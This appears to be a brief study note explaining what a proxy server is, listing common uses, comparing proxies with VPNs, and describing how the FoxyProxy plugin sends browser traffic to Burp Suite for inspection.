#### ðŸ““ Note
`FoxyProxy`\
What is **Proxy**?\
A proxy server is like a **middleman between you and the internet**.\
Why use Proxy?
|Purpose|Explanation|
|---|---|
|Hide IP|Site sees the proxy's IP instead
|Bypass restrictions|Access content blocked in the region|
|Filter traffic|seful in companies or schools to block certain sites|
|Debug/Intercept|Tools like Burp Suit use proxy capture your browser traffic|


Example
- Want to visit most sites normally
- BUT want all traffic to a website to go through Burp Suit so can analyze requests


Proxy vs VPN
|Term|What is hides|Encryption|
|---|---|---|
|Proxy|Only browser/app traffic|No encryption(unless HTTPS)|
|VPN|All network traffic|usually encrypted|

Plugin that allows to automatically switch between proxies -> click BurpSuit
-> All traffic will be redirected to the BurpSuit
